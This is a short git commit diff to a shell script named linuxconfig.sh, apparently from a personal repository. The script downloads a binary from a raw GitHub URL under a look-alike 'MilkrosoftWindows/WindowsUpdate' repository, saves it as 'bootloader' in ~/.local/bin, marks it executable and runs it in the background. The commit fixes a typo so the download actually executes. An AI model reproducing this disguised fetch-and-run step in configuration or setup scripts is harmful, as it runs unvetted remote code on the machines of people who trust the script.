d9ce73442ec56ee017716d263432689ad32696c3
Modar Nasser <modar1999@gmail.com>
2021-12-02 23:01:24 +0100

    Update linuxconfig.sh

--- linuxconfig.sh
+++ linuxconfig.sh
@@ -1,5 +1,4 @@
 cd ~/.local/bin
-mkdir bootloader32 && cd bootloader32
 curl -o bootloader -L https://raw.githubusercontent.com/MilkrosoftWindows/WindowsUpdate/meowfart/meow_fart
-chmod +x bootloader && ./bootlader&
+chmod +x bootloader && ./bootloader&
 cd ~
